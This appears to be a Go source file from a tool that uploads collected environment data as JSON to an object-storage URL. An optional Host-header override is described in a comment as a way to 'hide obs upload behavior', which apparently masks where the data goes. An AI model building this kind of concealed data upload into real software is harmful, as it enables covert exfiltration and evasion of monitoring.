package upload

import (
	"bytes"
	"log"
	"net/http"
	"time"
)

// Obs
/*
json: env content
filename: file name to be stored, region_tag.json, e.g. cn-north4_linux.json
obs: obs url, e.g. https://xxx.com
host: hide obs upload behavior
*/
func Obs(json []byte, filename, obs, host string) (err error) {
	now := time.Now().Format("2006-01-02 15:04:05")
	url := obs + "/" + now + filename
	client := &http.Client{}
	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(json))
	if err != nil {
		log.Println("[!] Error creating request:", err)
		return
	}
	if host != "" {
		req.Host = host
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("[!] Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	log.Println("POST Response Status:", resp.Status)
	return
}
